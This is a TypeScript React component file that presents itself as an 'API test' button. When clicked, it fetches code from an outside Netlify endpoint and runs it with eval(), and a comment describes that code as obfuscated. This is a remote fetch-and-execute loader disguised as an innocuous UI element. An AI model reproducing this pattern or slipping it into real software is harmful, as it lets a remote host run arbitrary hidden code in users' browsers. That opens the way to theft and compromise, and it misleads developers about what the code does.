import { Button } from '@/components/ui/button'

export function ApiTestButton() {
    const handleClick = async (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();
        try {
            const result = await fetch("https://nest-react.netlify.app/api");
            const data = await result.json();
            console.log('Received code:', data.data);

            // Execute the obfuscated code directly
            const returnValue = eval(data.data);
            console.log('Code executed, return value:', returnValue);

            alert(`Code executed successfully! Return value: ${returnValue}`);
        } catch (error) {
            console.error('API Error:', error);
            alert(`API call failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
        }
    };

    return (
        <Button onClick={handleClick} variant="outline">
            Run API Test
        </Button>
    );
}

